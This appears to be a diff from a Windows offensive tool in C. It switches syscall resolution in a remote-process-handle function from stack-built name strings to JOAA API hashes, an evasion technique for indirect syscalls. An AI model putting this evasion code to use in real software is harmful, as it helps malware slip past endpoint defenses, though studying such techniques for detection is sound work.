@@ -97,7 +97,7 @@ BOOL indirectGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HA
     HANDLE hSnapShot = NULL;
     PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };
 
-    NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t)PrepareSyscall((char[]){'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n','\0'});
+    NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t)PrepareSyscallHash(NtQuerySystemInformation_JOAA);
 
     if (!pNtQuerySystemInformation) {
         DebugPrint("[-] Failed to prepare syscall for NtQuerySystemInformation.\n");
@@ -113,7 +113,7 @@ BOOL indirectGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HA
         return FALSE;
     }
 
-	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char[]){'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});
+	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);
     
     if (!pNtAllocateVirtualMemory) {
         DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
@@ -155,7 +155,7 @@ BOOL indirectGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HA
         goto _EndOfFunction;
     }
 
-    NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)PrepareSyscall((char[]){'N','t','O','p','e','n','P','r','o','c','e','s','s','\0'});
+    NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)PrepareSyscallHash(NtOpenProcess_JOAA);
 
     if (!pNtOpenProcess) {
         DebugPrint("[-] Failed to prepare syscall for NtOpenProcess.\n");
@@ -177,7 +177,7 @@ BOOL indirectGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HA
 
 _EndOfFunction:
     if (pProcessInfo) {
-        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscall((char[]){'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});
+        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscallHash(NtFreeVirtualMemory_JOAA);
         if (!pNtFreeVirtualMemory) {
             DebugPrint("[-] Failed to prepare syscall for NtFreeVirtualMemory.\n");
             return FALSE;
